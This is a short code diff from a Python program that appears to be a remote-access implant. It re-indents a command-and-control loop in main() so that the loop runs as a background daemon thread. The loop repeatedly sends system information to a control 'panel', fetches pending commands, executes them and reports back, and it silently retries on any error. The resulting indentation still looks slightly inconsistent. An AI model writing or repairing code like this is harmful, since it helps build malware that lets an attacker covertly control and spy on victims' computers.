@@ -4638,22 +4638,22 @@ def main():
         
         c2 = C2Communication()
         
-def beacon_loop():
-     while True:
-         try:
-            c2.send_beacon()          # Send heartbeat/system info to panel
-            c2.fetch_commands()       # Poll panel for pending actions
-            c2.process_commands()     # Execute and report results
-            time.sleep(c2.beacon_interval)
-         except:
-            time.sleep(60)
+        def beacon_loop():
+           while True:
+               try:
+                   c2.send_beacon()          # Send heartbeat/system info to panel
+                   c2.fetch_commands()       # Poll panel for pending actions
+                   c2.process_commands()     # Execute and report results
+                   time.sleep(c2.beacon_interval)
+                except:
+                    time.sleep(60)
 
-            threading.Thread(target=beacon_loop, daemon=True).start()
+        threading.Thread(target=beacon_loop, daemon=True).start()
         
-         try:
+        try:
             while True:
                 time.sleep(1)
-         except KeyboardInterrupt:
+        except KeyboardInterrupt:
             pass
 
 if __name__ == "__main__":
